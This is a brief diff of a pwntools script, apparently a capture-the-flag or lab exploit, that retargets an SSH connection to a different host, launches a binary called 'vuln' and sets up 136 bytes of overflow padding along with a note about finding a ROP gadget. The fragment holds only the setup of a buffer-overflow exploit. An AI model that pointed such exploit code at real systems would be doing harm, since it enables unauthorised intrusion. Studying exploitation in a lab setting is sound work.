@@ -1,6 +1,6 @@
 from pwn import *
 
-s = ssh(host = '10.10.10.139')
+s = ssh(host = '192.168.1.1')
 p = s.process('/usr/bin/vuln')
 padding = ("A" * 136).encode()
 #ropper --file vuln --search "pop rdi; ret;"
